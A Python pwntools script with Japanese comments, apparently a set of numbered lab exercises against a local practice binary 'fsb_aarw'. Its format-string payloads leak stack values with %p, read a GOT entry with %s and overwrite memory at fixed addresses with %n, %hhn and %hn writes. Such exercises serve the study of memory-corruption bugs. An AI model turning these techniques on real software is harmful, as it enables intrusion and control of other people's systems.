#!/usr/bin/env python3

# gdbを使用するため、リモート接続してGUI画面上で実行すること

from pwn import *
import sys
import struct

bin_file = './fsb_aarw'
context(os = 'linux', arch = 'amd64')

context.binary = bin_file
#context.terminal = ['bash', 'splitw', '-h']  # 環境に応じて変えてください
#context.log_level = 'debug'  # または 'info'

binf = ELF(bin_file)

libc = binf.libc
offset_libc_setbuf    = libc.functions['setbuf'].address	# libcのsetbuf()のアドレス

# ユーザの入力の位置確認
def attack_35_19(conn, **kwargs):
    exploit = 'aaaaaaaa %p %p %p %p %p %p %p %p %p'
    conn.sendline(exploit)
    print(conn.recvall().decode())

# 設定した値の確認
def attack_35_20(conn, **kwargs):
    exploit = b'%9$p'.ljust(8, b'\x00')
    exploit += struct.pack('<Q', 0x404020)
    conn.sendline(exploit)
    print(conn.recvall().decode())

# GOTの読み出し（%sをつけて読み出す）
def attack_35_21(conn, **kwargs):
    exploit = b'%9$s'.ljust(8, b'\x00')
    exploit += struct.pack('<Q', 0x404020)
    conn.sendline(exploit)
    print(conn.recvall().hex())

# メモリ改竄
def attack_35_23(conn, **kwargs):
    exploit = b'%258c%10$n'.ljust(0x10, b'\x00')
    exploit += struct.pack('<Q', 0x404028)
    conn.sendline(exploit)
    print(conn.recvall())

# メモリ改竄
def attack_35_27(conn, **kwargs):
#   exploit = b'%13\$ln%86c%14\$hhn%34c%13\$hhn%4540c%15\$hn'.ljust(0x28,b'\x00')
    exploit = b'%13$ln%86c%14$hhn%34c%13$hhn%4540c%15$hn'.ljust(0x28,b'\x00') # '\'は消す
    exploit += struct.pack('<QQQ', 0x404028, 0x404029, 0x40402A)
    conn.sendline(exploit)
    print(conn.recvall())

def main():
    print('### attack_35_19 ###')
    conn = process(bin_file)
    attack_35_19(conn)
    
    print('### attack_35_20 ###')
    conn = process(bin_file)
    attack_35_20(conn)
    
    print('### attack_35_21 ###')
    conn = process(bin_file)
    attack_35_21(conn)
    
    print('### attack_35_23 ###')
    #conn = process(bin_file)
    conn = gdb.debug(bin_file)
    attack_35_23(conn)
    
    print('### attack_35_27 ###')
    #conn = process(bin_file)
    conn = gdb.debug(bin_file)
    attack_35_27(conn)
    
if __name__=='__main__':
    main()
